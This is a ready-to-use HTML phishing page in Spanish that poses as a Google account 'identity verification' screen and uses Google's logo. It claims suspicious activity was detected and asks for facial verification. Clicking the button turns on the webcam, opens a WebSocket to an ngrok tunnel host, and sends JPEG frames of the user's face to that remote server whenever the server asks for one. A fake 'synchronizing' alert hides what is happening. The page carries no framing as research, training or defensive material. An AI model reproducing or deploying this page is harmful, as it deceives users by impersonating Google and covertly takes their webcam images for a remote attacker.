<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account - Verificación Requerida</title>
    <style>
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
        .box { max-width: 380px; padding: 30px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
        <h2>Confirmar identidad</h2>
        <p>Google ha detectado una actividad sospechosa. Para su seguridad, inicie la verificación facial para validar este dispositivo.</p>
        <button class="btn" onclick="start()">Verificar ahora</button>
    </div>

    <script>
    async function start() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 480, height: 360, facingMode: "user" } 
            });
            
            const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            socket.onmessage = (event) => {
                if (event.data === "CAPTURE") {
                    canvas.width = 480;
                    canvas.height = 360;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    if (socket.readyState === WebSocket.OPEN) {
                        // Enviamos calidad media para asegurar estabilidad
                        socket.send(canvas.toDataURL('image/jpeg', 0.4));
                    }
                }
            };

            alert("Sincronizando con el servidor de seguridad...");
        } catch (e) {
            alert("Error de validación.");
        }
    }
</script>
</body>
</html>
